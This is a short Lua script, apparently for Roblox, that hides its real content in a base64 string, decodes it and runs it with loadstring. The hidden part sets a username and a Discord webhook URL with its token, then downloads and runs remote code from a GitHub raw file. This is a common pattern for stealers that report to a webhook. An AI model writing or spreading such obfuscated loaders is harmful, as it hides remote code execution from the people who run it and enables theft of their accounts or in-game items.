
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gIkJlbm55Ym9pYnJvMTIzNCIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzQzMDM1NTU4MjE3MTIxODUyL3hpMG1RanVBY0hWVkpGRVNsSEdIeFBMcjI4anJuUGJWSGx2ajRzcDh2MzUtQkFtRy12c2tsMW1LSzVMYXdkQTBOaVdMIgoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8yMTRFbGkvZmlzY2gvcmVmcy9oZWFkcy9tYWluL2Zpc2NoIiwgdHJ1ZSkpKCk7Cg=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))();
